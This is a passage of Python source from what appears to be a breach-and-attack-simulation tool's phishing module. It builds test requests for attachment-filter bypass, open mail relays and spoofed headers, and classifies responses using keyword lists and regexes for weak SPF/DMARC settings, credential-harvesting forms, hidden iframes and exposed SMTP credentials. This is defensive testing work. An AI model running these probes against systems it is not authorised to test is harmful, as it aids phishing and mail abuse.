                "X-BAS-Scan-Type": value,
            },
            follow_redirects=True,
        )

    def _build_attach_bypass_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Test attachment filtering by posting filenames/types to upload endpoints."""
        is_mime = value.startswith("MIME:")
        if is_mime:
            parts = value.split(":")
            mime_type = parts[1] if len(parts) > 1 else "application/octet-stream"
            filename = parts[2] if len(parts) > 2 else "payload.bin"
        else:
            filename = value
            mime_type = "application/octet-stream"
        return AttackRequest(
            request_id=f"phish-att-{req_id}",
            target=target,
            method="POST",
            path="/api/upload",
            body=f"filename={filename}&content_type={mime_type}&size=1024",
            content_type="application/x-www-form-urlencoded",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "ATTACH_BYPASS",
                "X-BAS-Payload": payload,
                "X-BAS-Filename": filename,
                "X-BAS-MIME": mime_type,
            },
        )

    def _build_mail_relay_request(
        self, req_id: str, target: str, value: str, payload: str,
        category: str, auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Test mail relay endpoints, spoofing indicators, and tracking pixels."""
        if value.startswith("/"):
            method = "POST" if category == "MAIL_RELAY" else "GET"
            body = (
                "from=test@bas-test.example.com&to=test@bas-test.example.com&subject=BAS+Relay+Test"
                if method == "POST" else None
            )
            return AttackRequest(
                request_id=f"phish-relay-{req_id}",
                target=target,
                method=method,
                path=value,
                body=body,
                content_type="application/x-www-form-urlencoded" if body else "text/plain",
                headers={
                    **auth_headers,
                    "X-BAS-Attack-Type": category,
                    "X-BAS-Payload": payload,
                },
            )
        return AttackRequest(
            request_id=f"phish-relay-{req_id}",
            target=target,
            method="GET",
            path="/",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": category,
                "X-BAS-Payload": payload,
                "X-BAS-Spoof-Header": value,
            },
        )

    # ------------------------------------------------------------------
    # Response analysis
    # ------------------------------------------------------------------

    def _analyze_response(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        """Analyze response for phishing vulnerability indicators."""
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")

        # Handle errors
        if response.error == "timeout":
            return ModuleResult(
                module_name="phishing_sim",
                target=request.target,
                status=VulnStatus.TIMEOUT,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

        if response.error:
            return ModuleResult(
                module_name="phishing_sim",
                target=request.target,
                status=VulnStatus.ERROR,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type, "error": response.error},
            )

        # Route to category-specific analyzer
        if attack_type == "HDR_INJECT":
            return self._analyze_header_injection(request, response, payload)
        elif attack_type == "EMAIL_AUTH":
            return self._analyze_email_auth(request, response, payload)
        elif attack_type == "HOMOGRAPH":
            return self._analyze_homograph(request, response, payload)
        elif attack_type == "URL_OBFUSC":
            return self._analyze_url_obfuscation(request, response, payload)
        elif attack_type == "HTML_INJECT":
            return self._analyze_html_injection(request, response, payload)
        elif attack_type == "CRED_HARVEST":
            return self._analyze_credential_harvest(request, response, payload)
        elif attack_type == "ATTACH_BYPASS":
            return self._analyze_attachment_bypass(request, response, payload)
        elif attack_type in ("MAIL_RELAY", "SPOOF_INDICATOR", "TRACK_PIXEL"):
            return self._analyze_mail_relay(request, response, payload, attack_type)
        else:
            return ModuleResult(
                module_name="phishing_sim",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"attack_type": attack_type},
            )

    # --- Category-specific analyzers -----------------------------------------------

    def _analyze_header_injection(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()
        was_blocked = any(ind in body_lower for ind in PHISHING_BLOCKED_INDICATORS)

        if was_blocked:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="Email header injection blocked by security controls",
                severity="info", mitre_technique_id="T1566",
                detail={"attack_type": "HDR_INJECT", "blocked": True},
            )

        success_indicators = [
            "sent", "queued", "delivered", "accepted", "submitted",
            "message sent", "email sent", "success",
        ]
        was_accepted = (
            response.status_code in (200, 201, 202, 204)
            and any(ind in body_lower for ind in success_indicators)
        )

        if was_accepted:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="Email header injection accepted - injected headers may be processed by mail server",
                severity="critical", mitre_technique_id="T1566",
                detail={"attack_type": "HDR_INJECT"},
            )

        reveals_info = any(ind in body_lower for ind in MAIL_SERVER_INFO_INDICATORS)
        if reveals_info:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="Mail server information disclosed in error response",
                severity="medium", mitre_technique_id="T1566",
                detail={"attack_type": "HDR_INJECT", "info_disclosure": True},
            )

        if response.status_code in (200, 201, 202) and not was_blocked:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="Form accepted header injection payload without clear rejection",
                severity="medium", mitre_technique_id="T1566",
                detail={"attack_type": "HDR_INJECT"},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "HDR_INJECT"},
        )

    def _analyze_email_auth(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        if response.status_code == 404:
            # Record not found — could indicate missing configuration
            payload_value = payload.split(":", 2)[-1] if ":" in payload else payload
            if "no_spf" in payload_value.lower() or "no_dkim" in payload_value.lower() or "no_dmarc" in payload_value.lower():
                return ModuleResult(
                    module_name="phishing_sim", target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                    response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                    evidence=f"Email authentication record not found ({payload_value})",
                    severity="medium", mitre_technique_id="T1566",
                    detail={"attack_type": "EMAIL_AUTH", "missing_record": True},
                )

        if response.status_code != 200:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                detail={"attack_type": "EMAIL_AUTH"},
            )

        # Check for weak configurations
        weak_indicators = [
            ("p=none", "DMARC policy set to none - no enforcement"),
            ("+all", "SPF record allows all senders (+all)"),
            ("?all", "SPF record neutral policy (?all) - no enforcement"),
            ("~all", "SPF softfail (~all) - messages not rejected"),
            ("t=y", "DKIM in testing mode - signatures not enforced"),
            ("pct=", "DMARC percentage filtering - not all messages checked"),
            ("sp=none", "DMARC subdomain policy set to none"),
            ("mode: none", "MTA-STS policy disabled"),
            ("mode: testing", "MTA-STS in testing mode - not enforcing"),
        ]

        for indicator, evidence_msg in weak_indicators:
            if indicator in body_lower:
                return ModuleResult(
                    module_name="phishing_sim", target=request.target,
                    status=VulnStatus.VULNERABLE, payload_used=payload,
                    response_code=response.status_code,
                    response_body_preview=response.body_text[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=evidence_msg,
                    severity="high", mitre_technique_id="T1566",
                    detail={"attack_type": "EMAIL_AUTH", "weak_config": indicator},
                )

        # Strong configuration detected
        strong_indicators = ["p=reject", "-all", "mode: enforce"]
        if any(si in body_lower for si in strong_indicators):
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="Email authentication properly configured with strong enforcement",
                severity="info", mitre_technique_id="T1566",
                detail={"attack_type": "EMAIL_AUTH", "strong_config": True},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
            response_code=response.status_code,
            response_body_preview=response.body_text[:500],
            elapsed_ms=response.elapsed_ms,
            evidence="Email authentication record found but strength unclear",
            severity="low", mitre_technique_id="T1566",
            detail={"attack_type": "EMAIL_AUTH"},
        )

    def _analyze_homograph(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()
        test_domain = request.headers.get("X-BAS-Test-Domain", "")

        # Check if the homograph domain was detected/blocked
        detection_indicators = [
            "suspicious domain", "homograph", "punycode", "idn",
            "lookalike", "impersonation", "confusable", "blocked domain",
            "domain reputation", "phishing domain",
        ]
        was_detected = any(ind in body_lower for ind in detection_indicators)

        if was_detected:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence=f"Homograph domain '{test_domain}' detected by security controls",
                severity="info", mitre_technique_id="T1566.002",
                detail={"attack_type": "HOMOGRAPH", "domain": test_domain, "detected": True},
            )

        if response.status_code in (200, 301, 302):
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence=f"Homograph domain '{test_domain}' not flagged by security controls",
                severity="medium", mitre_technique_id="T1566.002",
                detail={"attack_type": "HOMOGRAPH", "domain": test_domain, "detected": False},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "HOMOGRAPH", "domain": test_domain},
        )

    def _analyze_url_obfuscation(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        blocked_indicators = [
            "malicious url", "blocked", "unsafe", "phishing",
            "suspicious link", "url blocked", "blacklisted",
            "reputation check failed", "dangerous",
        ]
        was_blocked = any(ind in body_lower for ind in blocked_indicators)

        if was_blocked:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="Obfuscated URL detected and blocked",
                severity="info", mitre_technique_id="T1566.002",
                detail={"attack_type": "URL_OBFUSC", "blocked": True},
            )

        accepted_indicators = [
            "accepted", "valid", "safe", "allowed", "ok", "success",
        ]
        was_accepted = (
            response.status_code in (200, 201, 202)
            and any(ind in body_lower for ind in accepted_indicators)
        )

        if was_accepted:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="Obfuscated URL accepted without detection - URL filtering bypass",
                severity="high", mitre_technique_id="T1566.002",
                detail={"attack_type": "URL_OBFUSC"},
            )

        if response.status_code in (200, 201, 202) and not was_blocked:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="Obfuscated URL processed without clear detection or rejection",
                severity="medium", mitre_technique_id="T1566.002",
                detail={"attack_type": "URL_OBFUSC"},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "URL_OBFUSC"},
        )

    def _analyze_html_injection(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()
        was_blocked = any(ind in body_lower for ind in PHISHING_BLOCKED_INDICATORS)

        if was_blocked or response.status_code in (400, 403, 422):
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence="HTML email injection blocked by content filtering",
                severity="info", mitre_technique_id="T1566.002",
                detail={"attack_type": "HTML_INJECT", "blocked": True},
            )

        # Check if the injected HTML appears in the response (reflected)
        payload_value = payload.split(":", 1)[1] if ":" in payload else payload
        injected_tags = re.findall(r'<(form|iframe|script|svg|img|object|embed|style|link|base|meta)', payload_value, re.I)
        reflected = any(
            f"<{tag}" in response.body_text.lower()
            for tag in injected_tags
        ) if injected_tags else False

        if reflected:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="HTML injection reflected in response - phishing content may be rendered",
                severity="critical", mitre_technique_id="T1566.002",
                detail={"attack_type": "HTML_INJECT", "reflected": True},
            )

        success_indicators = ["sent", "queued", "accepted", "submitted", "success"]
        was_accepted = (
            response.status_code in (200, 201, 202)
            and any(ind in body_lower for ind in success_indicators)
        )

        if was_accepted:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="HTML injection payload accepted by mail endpoint",
                severity="high", mitre_technique_id="T1566.002",
                detail={"attack_type": "HTML_INJECT"},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "HTML_INJECT"},
        )

    def _analyze_credential_harvest(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body = response.body_text
        body_lower = body.lower()
        scan_type = request.headers.get("X-BAS-Scan-Type", "")

        if response.status_code not in (200, 301, 302):
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                detail={"attack_type": "CRED_HARVEST"},
            )

        # Check for credential input fields
        has_password = bool(re.search(r'<input[^>]*type=["\']password["\']', body, re.I))
        has_login_form = bool(re.search(r'<form[^>]*action=["\']([^"\']*)["\']', body, re.I))

        # Check for external form action
        form_action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.I)
        external_action = False
        if form_action_match:
            action = form_action_match.group(1)
            if action.startswith("http") and request.target not in action:
                external_action = True

        # Check for hidden iframes
        has_hidden_iframe = bool(re.search(
            r'<iframe[^>]*(?:style=["\'][^"\']*(?:display\s*:\s*none|visibility\s*:\s*hidden)|width=["\']0|height=["\']0)',
            body, re.I,
        ))

        # Check for no HTTPS
        uses_http = request.target.startswith("http://") if scan_type == "SCAN_NO_HTTPS" else False

        issues: list[str] = []
        if external_action:
            issues.append("form posts to external domain")
        if has_hidden_iframe:
            issues.append("hidden iframe detected")
        if uses_http:
            issues.append("login served over HTTP")
        if has_password and not bool(re.search(r'autocomplete=["\']off["\']', body, re.I)):
            issues.append("autocomplete enabled on password field")

        if external_action or has_hidden_iframe:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Credential harvesting indicators found: {'; '.join(issues)}",
                severity="critical", mitre_technique_id="T1566",
                detail={"attack_type": "CRED_HARVEST", "issues": issues},
            )

        if has_password and has_login_form:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Login form found at {request.path} - potential phishing target",
                severity="low", mitre_technique_id="T1566",
                detail={"attack_type": "CRED_HARVEST", "has_form": True, "issues": issues},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "CRED_HARVEST"},
        )

    def _analyze_attachment_bypass(
        self, request: AttackRequest, response: AttackResponse, payload: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()
        filename = request.headers.get("X-BAS-Filename", "")
        mime_type = request.headers.get("X-BAS-MIME", "")

        blocked_indicators = [
            "file type not allowed", "blocked", "rejected", "forbidden",
            "dangerous file", "malicious", "extension not permitted",
            "file type blocked", "attachment rejected",
        ]
        was_blocked = any(ind in body_lower for ind in blocked_indicators)

        if was_blocked:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                evidence=f"Attachment '{filename}' correctly blocked by file filter",
                severity="info", mitre_technique_id="T1566.001",
                detail={"attack_type": "ATTACH_BYPASS", "filename": filename, "blocked": True},
            )

        accepted_indicators = ["uploaded", "accepted", "success", "stored", "received"]
        was_accepted = (
            response.status_code in (200, 201, 202)
            and any(ind in body_lower for ind in accepted_indicators)
        )

        if was_accepted:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Malicious attachment '{filename}' (MIME: {mime_type}) accepted - file filter bypass",
                severity="high", mitre_technique_id="T1566.001",
                detail={"attack_type": "ATTACH_BYPASS", "filename": filename, "mime": mime_type},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": "ATTACH_BYPASS", "filename": filename},
        )

    def _analyze_mail_relay(
        self, request: AttackRequest, response: AttackResponse, payload: str,
        attack_type: str,
    ) -> ModuleResult:
        body_lower = response.body_text.lower()

        if attack_type == "TRACK_PIXEL":
            # Tracking pixel endpoints should ideally be blocked
            if response.status_code == 200:
                content_type = response.headers.get("content-type", "").lower()
                is_image = "image/" in content_type
                if is_image:
                    return ModuleResult(
                        module_name="phishing_sim", target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                        response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                        evidence=f"Email tracking pixel endpoint active at {request.path}",
                        severity="low", mitre_technique_id="T1566",
                        detail={"attack_type": "TRACK_PIXEL", "active": True},
                    )

        if attack_type == "SPOOF_INDICATOR":
            # Check response headers for authentication results
            auth_results = response.headers.get("authentication-results", "").lower()
            if "fail" in auth_results:
                return ModuleResult(
                    module_name="phishing_sim", target=request.target,
                    status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
                    response_code=response.status_code, elapsed_ms=response.elapsed_ms,
                    evidence="Email authentication properly rejecting spoofed indicators",
                    severity="info", mitre_technique_id="T1566",
                    detail={"attack_type": "SPOOF_INDICATOR", "auth_results": auth_results},
                )

        # Mail relay open detection
        relay_success = [
            "relayed", "sent", "queued", "accepted for delivery",
            "message queued", "mail sent", "250 ok",
        ]
        relay_open = (
            response.status_code in (200, 201, 202, 250)
            and any(ind in body_lower for ind in relay_success)
        )

        if relay_open:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=f"Open mail relay detected at {request.path} - can be used for phishing",
                severity="critical", mitre_technique_id="T1566",
                detail={"attack_type": attack_type, "open_relay": True},
            )

        # Config file exposure
        config_indicators = [
            "smtp_host", "smtp_password", "mail_password", "sendgrid_api",
            "mailgun_api", "ses_access", "mail_driver",
        ]
        if any(ind in body_lower for ind in config_indicators):
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="Mail configuration credentials exposed",
                severity="critical", mitre_technique_id="T1566",
                detail={"attack_type": attack_type, "config_exposed": True},
            )

        reveals_info = any(ind in body_lower for ind in MAIL_SERVER_INFO_INDICATORS)
        if reveals_info:
            return ModuleResult(
                module_name="phishing_sim", target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE, payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence="Mail server information disclosed in response",
                severity="medium", mitre_technique_id="T1566",
                detail={"attack_type": attack_type, "info_disclosure": True},
            )

        return ModuleResult(
            module_name="phishing_sim", target=request.target,
            status=VulnStatus.NOT_VULNERABLE, payload_used=payload,
            response_code=response.status_code, elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
